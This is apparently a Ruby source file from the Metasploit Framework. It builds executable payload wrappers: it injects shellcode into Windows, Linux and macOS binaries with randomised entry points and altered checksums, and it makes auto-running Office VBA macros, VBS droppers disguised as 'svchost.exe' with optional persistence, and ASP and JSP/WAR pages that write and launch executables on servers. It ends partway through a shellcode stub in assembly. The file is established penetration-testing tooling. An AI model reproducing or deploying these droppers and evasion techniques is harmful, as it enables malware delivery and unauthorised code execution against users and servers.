###
#
# framework-util-exe
# --------------
#
# The class provides methods for creating and encoding executable file
# formats for various platforms. It is a replacement for the previous
# code in Rex::Text
#
###

module Msf
module Util
class EXE

require 'rex'
require 'rex/peparsey'
require 'rex/pescan'
require 'rex/zip'
require 'metasm'

	##
	#
	# Executable generators
	#
	##

	def self.to_executable(framework, arch, plat, code='', opts={})
		if (arch.index(ARCH_X86))

			if (plat.index(Msf::Module::Platform::Windows))
				return to_win32pe(framework, code, opts)
			end

			if (plat.index(Msf::Module::Platform::Linux))
				return to_linux_x86_elf(framework, code)
			end

			if(plat.index(Msf::Module::Platform::OSX))
				return to_osx_x86_macho(framework, code)
			end

			# XXX: Add remaining x86 systems here
		end

		if( arch.index(ARCH_X86_64) or arch.index( ARCH_X64 ) )
			if (plat.index(Msf::Module::Platform::Windows))
				return to_win64pe(framework, code, opts)
			end
		end

		if(arch.index(ARCH_ARMLE))
			if(plat.index(Msf::Module::Platform::OSX))
				return to_osx_arm_macho(framework, code)
			end
			# XXX: Add Linux here
		end

		if(arch.index(ARCH_PPC))
			if(plat.index(Msf::Module::Platform::OSX))
				return to_osx_ppc_macho(framework, code)
			end
			# XXX: Add PPC OS X and Linux here
		end
		nil
	end


	def self.to_win32pe(framework, code, opts={})

		# Allow the user to specify their own EXE template
		opts[:template] ||= File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template.exe")

		# Copy the code to a new RWX segment to allow for self-modifying encoders
		payload = win32_rwx_exec(code)

		# Create a new PE object and run through sanity checks
		pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
		text = nil
		pe.sections.each do |sec|
			text = sec if sec.name == ".text"
			break if text
		end

		if(not text)
			raise RuntimeError, "No .text section found in the template exe"
		end

		if ! text.contains_rva?(pe.hdr.opt.AddressOfEntryPoint)
			raise RuntimeError, "The .text section does not contain an entry point"
		end

		if(text.size < (payload.length + 256))
			raise RuntimeError, "The .text section is too small to be usable"
		end

		# Store some useful offsets
		off_ent = pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint)
		off_beg = pe.rva_to_file_offset(text.base_rva)

		# We need to make sure our injected code doesn't conflict with the
		# the data directories stored in .text (import, export, etc)
		mines = []
		pe.hdr.opt['DataDirectory'].each do |dir|
			next if dir.v['Size'] == 0
			next if not text.contains_rva?( dir.v['VirtualAddress'] )
			mines << [ pe.rva_to_file_offset(dir.v['VirtualAddress']) - off_beg, dir.v['Size'] ]
		end

		# Break the text segment into contiguous blocks
		blocks = []
		bidx   = 0
		mines.sort{|a,b| a[0] <=> b[0]}.each do |mine|
			bbeg = bidx
			bend = mine[0]
			if(bbeg != bend)
				blocks << [bidx, bend-bidx]
			end
			bidx = mine[0] + mine[1]
		end

		# Add the ending block
		if(bidx < text.size - 1)
			blocks << [bidx, text.size - bidx]
		end

		# Find the largest contiguous block
		blocks.sort!{|a,b| b[1]<=>a[1]}
		block = blocks[0]

		# TODO: Allow the entry point in a different block
		if(payload.length + 256 > block[1])
			raise RuntimeError, "The largest block in .text does not have enough contiguous space (need:#{payload.length+256} found:#{block[1]})"
		end

		# Make a copy of the entire .text section
		data = text.read(0,text.size)

		# Pick a random offset to store the payload
		poff = rand(block[1] - payload.length - 256)

		# Flip a coin to determine if EP is before or after
		eloc = rand(2)
		eidx = nil

		# Pad the entry point with random nops
		entry = generate_nops(framework, [ARCH_X86], rand(200)+51)

		# Pick an offset to store the new entry point
		if(eloc == 0) # place the entry point before the payload
			poff += 256
			eidx = rand(poff-(entry.length + 5))
		else          # place the entry pointer after the payload
			poff -= 256
			eidx = rand(block[1] - (poff + payload.length)) + poff + payload.length
		end

		# Relative jump from the end of the nops to the payload
		entry += "\xe9" + [poff - (eidx + entry.length + 5)].pack('V')

		# Mangle random bits of the original executable
		1.upto(rand(block[1] / 512)) do
			data[ block[0] + rand(block[1]), 1] = [rand(0x100)].pack("C")
		end

		# Patch the payload and the new entry point into the .text
		data[block[0] + poff, payload.length] = payload
		data[block[0] + eidx, entry.length]   = entry

		# Create the modified version of the input executable
		exe = ''
		File.open(opts[:template], 'rb') do |fd|
			exe = fd.read( File.size(opts[:template]) )
		end
		exe[ exe.index([pe.hdr.opt.AddressOfEntryPoint].pack('V')), 4] = [ text.base_rva + block[0] + eidx ].pack("V")
		exe[off_beg, data.length] = data

		tds = pe.hdr.file.TimeDateStamp
		exe[ exe.index([ tds ].pack('V')), 4] = [tds - rand(0x1000000)].pack("V")

		cks = pe.hdr.opt.CheckSum
		if(cks != 0)
			exe[ exe.index([ cks ].pack('V')), 4] = [0].pack("V")
		end

		pe.close

		exe
	end


	def self.to_win32pe_old(framework, code, opts={})
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template-old.exe"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		if(code.length < 2048)
			code << Rex::Text.rand_text(2048-code.length)
		end

		if(code.length > 2048)
			raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
		end

		bo = pe.index('PAYLOAD:')
		pe[bo,  2048] = code if bo
		pe[136,    4] = [rand(0x100000000)].pack('V')

		ci = pe.index("\x31\xc9" * 160)
		cd = pe.index("\x31\xc9" * 160, ci + 320)
		rc = pe[ci+320, cd-ci-320]

		# 640 + rc.length bytes of room to store an encoded rc at offset ci
		enc = encode_stub(framework, [ARCH_X86], rc, ::Msf::Module::PlatformList.win32)
		lft = 640+rc.length - enc.length

		buf = enc + Rex::Text.rand_text(640+rc.length - enc.length)
		pe[ci, buf.length] = buf

		# Make the data section executable
		xi = pe.index([0xc0300040].pack('V'))
		pe[xi,4] = [0xe0300020].pack('V')

		# Add a couple random bytes for fun
		pe << Rex::Text.rand_text(rand(64)+4)

		return pe
	end

	def self.to_win64pe(framework, code, opts={})
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_x64_windows.exe"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		bo = pe.index('PAYLOAD:')
		pe[bo,2048] = [code].pack('a2048') if bo

		return pe
	end

	def self.to_win32pe_service(framework, code, name='SERVICENAME')
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "service.exe"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		bo = pe.index('PAYLOAD:')
		pe[bo, 2048] = [code].pack('a2048') if bo

		bo = pe.index('SERVICENAME')
		pe[bo, 11] = [name].pack('a11') if bo

		pe[136, 4] = [rand(0x100000000)].pack('V')

		return pe
	end

	def self.to_osx_arm_macho(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_armle_darwin.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 2048] = [code].pack('a2048') if bo
		return mo
	end

	def self.to_osx_ppc_macho(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_ppc_darwin.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 2048] = [code].pack('a2048') if bo

		return mo
	end

	def self.to_osx_x86_macho(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_x86_darwin.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 2048] = [code].pack('a2048') if bo

		return mo
	end

	def self.to_linux_x86_elf(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_x86_linux.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		# The old way to do it is like other formats, just overwrite a big
		# block of rwx mem with our shellcode.
		#bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		#co = mo.index( " " * 512 )
		#mo[bo, 2048] = [code].pack('a2048') if bo

		# The new template is just an ELF header with its entry point set to
		# the end of the file, so just append shellcode to it and fixup
		# p_filesz and p_memsz in the header for a working ELF executable.
		mo << code
		mo[0x44,4] = [mo.length + code.length].pack('V')
		mo[0x48,4] = [mo.length + code.length].pack('V')

		return mo
	end
	def self.to_exe_vba(exes='')
		exe = exes.unpack('C*')
		vba = ""
		idx = 0
		maxbytes = 2000

		var_magic    = Rex::Text.rand_text_alpha(10).capitalize
		var_base     = Rex::Text.rand_text_alpha(5).capitalize
		var_base_idx = 0

		# First write the macro into the vba file
		var_fname = var_base + (var_base_idx+=1).to_s
		var_fenvi = var_base + (var_base_idx+=1).to_s
		var_fhand = var_base + (var_base_idx+=1).to_s
		var_parag = var_base + (var_base_idx+=1).to_s
		var_itemp = var_base + (var_base_idx+=1).to_s
		var_btemp = var_base + (var_base_idx+=1).to_s
		var_appnr = var_base + (var_base_idx+=1).to_s
		var_index = var_base + (var_base_idx+=1).to_s
		var_gotmagic = var_base + (var_base_idx+=1).to_s
		var_farg = var_base + (var_base_idx+=1).to_s
		var_stemp = var_base + (var_base_idx+=1).to_s

		# Function 1 extracts the binary
		func_name1 = var_base + (var_base_idx+=1).to_s

		# Function 2 executes the binary
		func_name2 = var_base + (var_base_idx+=1).to_s

		vba << "'**************************************************************\r\n"
		vba << "'*\r\n"
		vba << "'* This code is now split into two pieces:\r\n"
		vba << "'*  1. The Macro. This must be copied into the Office document\r\n"
		vba << "'*     macro editor. This macro will run on startup.\r\n"
		vba << "'*\r\n"
		vba << "'*  2. The Data. The hex dump at the end of this output must be\r\n"
		vba << "'*     appended to the end of the document contents.\r\n"
		vba << "'*\r\n"
		vba << "'**************************************************************\r\n"
		vba << "'*\r\n"
		vba << "'* MACRO CODE\r\n"
		vba << "'*\r\n"
		vba << "'**************************************************************\r\n"

		# The wrapper makes it easier to integrate it into other macros
		vba << "Sub Auto_Open()\r\n"
		vba << "\t#{func_name1}\r\n"
		vba << "End Sub\r\n"

		vba << "Sub #{func_name1}()\r\n"
		vba << "\tDim #{var_appnr} As Integer\r\n"
		vba << "\tDim #{var_fname} As String\r\n"
		vba << "\tDim #{var_fenvi} As String\r\n"
		vba << "\tDim #{var_fhand} As Integer\r\n"
		vba << "\tDim #{var_parag} As Paragraph\r\n"
		vba << "\tDim #{var_index} As Integer\r\n"
		vba << "\tDim #{var_gotmagic} As Boolean\r\n"
		vba << "\tDim #{var_itemp} As Integer\r\n"
		vba << "\tDim #{var_stemp} As String\r\n"
		vba << "\tDim #{var_btemp} As Byte\r\n"
		vba << "\tDim #{var_magic} as String\r\n"
		vba << "\t#{var_magic} = \"#{var_magic}\"\r\n"
		vba << "\t#{var_fname} = \"#{Rex::Text.rand_text_alpha(rand(8)+8)}.exe\"\r\n"
		vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
		vba << "\tChDrive (#{var_fenvi})\r\n"
		vba << "\tChDir (#{var_fenvi})\r\n"
		vba << "\t#{var_fhand} = FreeFile()\r\n"
		vba << "\tOpen #{var_fname} For Binary As #{var_fhand}\r\n"
		vba << "\tFor Each #{var_parag} in ActiveDocument.Paragraphs\r\n"
		vba << "\t\tDoEvents\r\n"
		vba << "\t\t\t#{var_stemp} = #{var_parag}.Range.Text\r\n"
		vba << "\t\tIf (#{var_gotmagic} = True) Then\r\n"
		vba << "\t\t\t#{var_index} = 1\r\n"
		vba << "\t\t\tWhile (#{var_index} < Len(#{var_stemp}))\r\n"
		vba << "\t\t\t\t#{var_btemp} = Mid(#{var_stemp},#{var_index},4)\r\n"
		vba << "\t\t\t\tPut ##{var_fhand}, , #{var_btemp}\r\n"
		vba << "\t\t\t\t#{var_index} = #{var_index} + 4\r\n"
		vba << "\t\t\tWend\r\n"
		vba << "\t\tElseIf (InStr(1,#{var_stemp},#{var_magic}) > 0 And Len(#{var_stemp}) > 0) Then\r\n"
		vba << "\t\t\t#{var_gotmagic} = True\r\n"
		vba << "\t\tEnd If\r\n"
		vba << "\tNext\r\n"
		vba << "\tClose ##{var_fhand}\r\n"
		vba << "\t#{func_name2}(#{var_fname})\r\n"
		vba << "End Sub\r\n"

		vba << "Sub #{func_name2}(#{var_farg} As String)\r\n"
		vba << "\tDim #{var_appnr} As Integer\r\n"
		vba << "\tDim #{var_fenvi} As String\r\n"
		vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
		vba << "\tChDrive (#{var_fenvi})\r\n"
		vba << "\tChDir (#{var_fenvi})\r\n"
		vba << "\t#{var_appnr} = Shell(#{var_farg}, vbHide)\r\n"
		vba << "End Sub\r\n"

		vba << "Sub AutoOpen()\r\n"
		vba << "\tAuto_Open\r\n"
		vba << "End Sub\r\n"

		vba << "Sub Workbook_Open()\r\n"
		vba << "\tAuto_Open\r\n"
		vba << "End Sub\r\n"
		vba << "'**************************************************************\r\n"
		vba << "'*\r\n"
		vba << "'* PAYLOAD DATA\r\n"
		vba << "'*\r\n"
		vba << "'**************************************************************\r\n\r\n\r\n"
		vba << "#{var_magic}\r\n"

		# Writing the bytes of the exe to the file
		1.upto(exe.length) do |pc|
			while(c = exe[idx])
				vba << "&H#{("%.2x" % c).upcase}"
				if (idx > 1 and (idx % maxbytes) == 0)
					# When maxbytes are written make a new paragrpah
					vba << "\r\n"
				end
				idx += 1
			end
		end
		return vba
	end

	def self.to_win32pe_vba(framework, code, opts={})
		to_exe_vba(to_win32pe(framework, code, opts))
	end

	def self.to_exe_vbs(exes = '', opts={})
		delay   = opts[:delay]   || 5
		persist = opts[:persist] || false

		exe = exes.unpack('C*')
		vbs = ""

		var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
		var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
		var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
		var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
		var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
		var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)

		vbs << "Function #{var_func}()\r\n"

		vbs << "#{var_bytes}=Chr(#{exe[0]})"

		lines = []
		1.upto(exe.length-1) do |byte|
			if(byte % 100 == 0)
				lines.push "\r\n#{var_bytes}=#{var_bytes}"
			end
			# exe is an Array of bytes, not a String, thanks to the unpack
			# above, so the following line is not subject to the different
			# treatments of String#[] between ruby 1.8 and 1.9
			lines.push "&Chr(#{exe[byte]})"
		end
		vbs << lines.join("") + "\r\n"

		vbs << "Dim #{var_obj}\r\n"
		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
		vbs << "Dim #{var_stream}\r\n"
		vbs << "Dim #{var_tempdir}\r\n"
		vbs << "Dim #{var_tempexe}\r\n"
		vbs << "Dim #{var_basedir}\r\n"
		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"

		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
		vbs << "#{var_stream}.Close\r\n"
		vbs << "Dim #{var_shell}\r\n"
		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"

		vbs << "#{var_shell}.run #{var_tempexe}, 0, true\r\n"
		vbs << "#{var_obj}.DeleteFile(#{var_tempexe})\r\n"
		vbs << "#{var_obj}.DeleteFolder(#{var_basedir})\r\n"
		vbs << "End Function\r\n"

		vbs << "Do\r\n" if persist
		vbs << "#{var_func}\r\n"
		vbs << "WScript.Sleep #{delay * 1000}\r\n" if persist
		vbs << "Loop\r\n" if persist
		vbs
	end

	def self.to_exe_asp(exes = '', opts={})
		exe = exes.unpack('C*')
		vbs = "<%\r\n"

		var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
		var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
		var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
		var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
		var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
		var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)

		vbs << "Sub #{var_func}()\r\n"

		vbs << "#{var_bytes}=Chr(#{exe[0]})"

		lines = []
		1.upto(exe.length-1) do |byte|
			if(byte % 100 == 0)
				lines.push "\r\n#{var_bytes}=#{var_bytes}"
			end
			# exe is an Array of bytes, not a String, thanks to the unpack
			# above, so the following line is not subject to the different
			# treatments of String#[] between ruby 1.8 and 1.9
			lines.push "&Chr(#{exe[byte]})"
		end
		vbs << lines.join("") + "\r\n"

		vbs << "Dim #{var_obj}\r\n"
		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
		vbs << "Dim #{var_stream}\r\n"
		vbs << "Dim #{var_tempdir}\r\n"
		vbs << "Dim #{var_tempexe}\r\n"
		vbs << "Dim #{var_basedir}\r\n"
		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"

		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
		vbs << "#{var_stream}.Close\r\n"
		vbs << "Dim #{var_shell}\r\n"
		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"

		vbs << "#{var_shell}.run #{var_tempexe}, 0, false\r\n"
		vbs << "End Sub\r\n"

		vbs << "#{var_func}\r\n"
		vbs << "%>\r\n"
		vbs
	end

	def self.to_win32pe_vbs(framework, code, opts={})
		to_exe_vbs(to_win32pe(framework, code, opts), opts)
	end

	def self.to_win32pe_asp(framework, code, opts={})
		to_exe_asp(to_win32pe(framework, code, opts), opts)
	end

	# Creates a Web Archive (WAR) file containing a jsp page and hexdump of a payload.
	# The jsp page converts the hexdump back to a normal .exe file and places it in
	# the temp directory. The payload .exe file is then executed.
	def self.to_jsp_war(framework, arch, plat, code='', opts={})

		exe = to_executable(framework, arch, plat, code, opts)
		jsp_name = opts[:jsp_name]
		jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)

		zip = Rex::Zip::Archive.new

		# begin meta-inf/
		minf = [ 0xcafe, 0x0003 ].pack('Vv')
		zip.add_file('META-INF/', nil, minf)
		# end meta-inf/

		# begin meta-inf/manifest.mf
		mfraw = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
		zip.add_file('META-INF/MANIFEST.MF', mfraw)
		# end meta-inf/manifest.mf

		# begin web-inf/
		zip.add_file('WEB-INF/', '')
		# end web-inf/

		# begin web-inf/web.xml
		webxmlraw = %q{<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtds/web-app_2_3.dtd">
<web-app>
 <servlet>
  <servlet-name>NAME</servlet-name>
  <jsp-file>/PAYLOAD.jsp</jsp-file>
 </servlet>
</web-app>
}
		var_name = Rex::Text.rand_text_alpha_lower(rand(8)+8)
		webxmlraw.gsub!(/NAME/, var_name)
		webxmlraw.gsub!(/PAYLOAD/, jsp_name)

		zip.add_file('WEB-INF/web.xml', webxmlraw)
		# end web-inf/web.xml

		# begin <payload>.jsp
		var_hexpath       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_exepath       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_data          = Rex::Text.rand_text_alpha(rand(8)+8)
		var_inputstream   = Rex::Text.rand_text_alpha(rand(8)+8)
		var_outputstream  = Rex::Text.rand_text_alpha(rand(8)+8)
		var_numbytes      = Rex::Text.rand_text_alpha(rand(8)+8)
		var_bytearray     = Rex::Text.rand_text_alpha(rand(8)+8)
		var_bytes         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_counter       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_char1         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_char2         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_comb          = Rex::Text.rand_text_alpha(rand(8)+8)
		var_exe           = Rex::Text.rand_text_alpha(rand(8)+8)
		var_hexfile       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_proc          = Rex::Text.rand_text_alpha(rand(8)+8)

		jspraw =  "<%@ page import=\"java.io.*\" %>\n"
		jspraw << "<%\n"
		jspraw << "String #{var_hexpath} = application.getRealPath(\"/\") + \"/#{var_hexfile}.txt\";\n"
		jspraw << "String #{var_exepath} = System.getProperty(\"java.io.tmpdir\") + \"/#{var_exe}\";\n"
		jspraw << "String #{var_data} = \"\";\n"

		jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n"
		jspraw << "#{var_exepath} = #{var_exepath}.concat(\".exe\");\n"
		jspraw << "}\n"

		jspraw << "FileInputStream #{var_inputstream} = new FileInputStream(#{var_hexpath});\n"
		jspraw << "FileOutputStream #{var_outputstream} = new FileOutputStream(#{var_exepath});\n"

		jspraw << "int #{var_numbytes} = #{var_inputstream}.available();\n"
		jspraw << "byte #{var_bytearray}[] = new byte[#{var_numbytes}];\n"
		jspraw << "#{var_inputstream}.read(#{var_bytearray});\n"
		jspraw << "#{var_inputstream}.close();\n"

		jspraw << "byte[] #{var_bytes} = new byte[#{var_numbytes}/2];\n"
		jspraw << "for (int #{var_counter} = 0; #{var_counter} < #{var_numbytes}; #{var_counter} += 2)\n"
		jspraw << "{\n"
		jspraw << "char #{var_char1} = (char) #{var_bytearray}[#{var_counter}];\n"
		jspraw << "char #{var_char2} = (char) #{var_bytearray}[#{var_counter} + 1];\n"
		jspraw << "int #{var_comb} = Character.digit(#{var_char1}, 16) & 0xff;\n"
		jspraw << "#{var_comb} <<= 4;\n"
		jspraw << "#{var_comb} += Character.digit(#{var_char2}, 16) & 0xff;\n"
		jspraw << "#{var_bytes}[#{var_counter}/2] = (byte)#{var_comb};\n"
		jspraw << "}\n"

		jspraw << "#{var_outputstream}.write(#{var_bytes});\n"
		jspraw << "#{var_outputstream}.close();\n"

		jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
		jspraw << "%>\n"

		zip.add_file("#{jsp_name}.jsp", jspraw)
		# end <payload>.jsp

		# begin <payload>.txt
		payloadraw = exe.unpack('H*')[0]
		zip.add_file("#{var_hexfile}.txt", payloadraw)
		# end <payload>.txt

		return zip.pack
	end


	# Creates a .NET DLL which loads data into memory
	# at a specified location with read/execute permissions
	#    - the data will be loaded at: base+0x2065
	#    - max size is 0x8000 (32768)
	def self.to_dotnetmem(base=0x12340000, data="")
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "dotnetmem.dll"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		# Configure the image base
		pe[180, 4] = [base].pack('V')

		# Configure the TimeDateStamp
		pe[136, 4] = [rand(0x100000000)].pack('V')

		# XXX: Unfortunately we cant make this RWX only RX
		# Mark this segment as read-execute AND writable
		# pe[412,4] = [0xe0000020].pack("V")

		# Write the data into the .text segment
		pe[0x1065, 0x8000] = [data].pack("a32768")

		# Generic a randomized UUID
		pe[37656,16] = Rex::Text.rand_text(16)

		return pe
	end


	def self.encode_stub(framework, arch, code, platform = nil)
		return code if not framework.encoders
		framework.encoders.each_module_ranked('Arch' => arch) do |name, mod|
			begin
				enc = framework.encoders.create(name)
				raw = enc.encode(code, '', nil, platform)
				return raw if raw
			rescue
			end
		end
		nil
	end

	def self.generate_nops(framework, arch, len, opts={})
		opts['BadChars'] ||= ''
		opts['SaveRegisters'] ||= [ 'esp', 'ebp', 'esi', 'edi' ]

		return code if not framework.nops
		framework.nops.each_module_ranked('Arch' => arch) do |name, mod|
			begin
				nop = framework.nops.create(name)
				raw = nop.generate_sled(len, opts)
				return raw if raw
			rescue
			end
		end
		nil
	end

	# This wrapper is responsible for allocating RWX memory, copying the
	# target code there, setting an exception handler that calls ExitProcess
	# and finally executing the code.
	def self.win32_rwx_exec(code)

		stub_block = %Q^
		; Input: The hash of the API to call and all its parameters must be pushed onto stack.
		; Output: The return value from the API call will be in EAX.
		; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
		; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
		; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
		; Note: This function is unable to call forwarded exports.

		api_call:
		  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
		  mov ebp, esp           ; Create a new stack frame
		  xor edx, edx           ; Zero EDX
		  mov edx, [fs:edx+48]   ; Get a pointer to the PEB
		  mov edx, [edx+12]      ; Get PEB->Ldr
		  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
		next_mod:                ;
		  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
		  movzx ecx, word [edx+38] ; Set ECX to the length we want to check
		  xor edi, edi           ; Clear EDI which will store the hash of the module name
		loop_modname:            ;
		  xor eax, eax           ; Clear EAX
		  lodsb                  ; Read in the next byte of the name
		  cmp al, 'a'            ; Some versions of Windows use lower case module names
		  jl not_lowercase       ;
		  sub al, 0x20           ; If so normalise to uppercase
		not_lowercase:           ;
		  ror edi, 13            ; Rotate right our hash value
		  add edi, eax           ; Add the next byte of the name
		  loop loop_modname      ; Loop untill we have read enough
		  ; We now have the module hash computed
		  push edx               ; Save the current position in the module list for later
		  push edi               ; Save the current module hash for later
		  ; Proceed to itterate the export address table,
		  mov edx, [edx+16]      ; Get this modules base address
		  mov eax, [edx+60]      ; Get PE header
		  add eax, edx           ; Add the modules base address
		  mov eax, [eax+120]     ; Get export tables RVA
		  test eax, eax          ; Test if no export address table is present
		  jz get_next_mod1       ; If no EAT present, process the next module
		  add eax, edx           ; Add the modules base address
		  push eax               ; Save the current modules EAT
		  mov ecx, [eax+24]      ; Get the number of function names
		  mov ebx, [eax+32]      ; Get the rva of the function names
		  add ebx, edx           ; Add the modules base address
		  ; Computing the module hash + function hash
		get_next_func:           ;
		  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
		  dec ecx                ; Decrement the function name counter
		  mov esi, [ebx+ecx*4]   ; Get rva of next module name
		  add esi, edx           ; Add the modules base address
		  xor edi, edi           ; Clear EDI which will store the hash of the function name
		  ; And compare it to the one we want
		loop_funcname:           ;
		  xor eax, eax           ; Clear EAX
		  lodsb                  ; Read in the next byte of the ASCII function name
		  ror edi, 13            ; Rotate right our hash value
		  add edi, eax           ; Add the next byte of the name
		  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
		  jne loop_funcname      ; If we have not reached the null terminator, continue
		  add edi, [ebp-8]       ; Add the current module hash to the function hash
		  cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
		  jnz get_next_func      ; Go compute the next function hash if we have not found it
		  ; If found, fix up stack, call the function and then value else compute the next one...
		  pop eax                ; Restore the current modules EAT
		  mov ebx, [eax+36]      ; Get the ordinal table rva
		  add ebx, edx           ; Add the modules base address
		  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
		  mov ebx, [eax+28]      ; Get the function addresses table rva
		  add ebx, edx           ; Add the modules base address
		  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
		  add eax, edx           ; Add the modules base address to get the functions actual VA
		  ; We now fix up the stack and perform the call to the desired function...
		finish:
		  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
		  pop ebx                ; Clear off the current modules hash
		  pop ebx                ; Clear off the current position in the module list
		  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
		  pop ecx                ; Pop off the origional return address our caller will have pushed
		  pop edx                ; Pop off the hash value our caller will have pushed
		  push ecx               ; Push back the correct return value
		  jmp eax                ; Jump into the required function
		  ; We now automagically return to the correct caller...
		get_next_mod:            ;
		  pop eax                ; Pop off the current (now the previous) modules EAT
		get_next_mod1:           ;
		  pop edi                ; Pop off the current (now the previous) modules hash
		  pop edx                ; Restore our position in the module list
		  mov edx, [edx]         ; Get the next module
		  jmp short next_mod     ; Process this module
		^

		stub_exit = %Q^
		; Input: EBP must be the address of 'api_call'.
		; Output: None.
		; Clobbers: EAX, EBX, (ESP will also be modified)
		; Note: Execution is not expected to (successfully) continue past this block

		exitfunk:
		  mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
		  push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
		  call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
		  cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
		  jl short goodbye       ; Then just call the exit function...
		  cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
		  jne short goodbye      ;
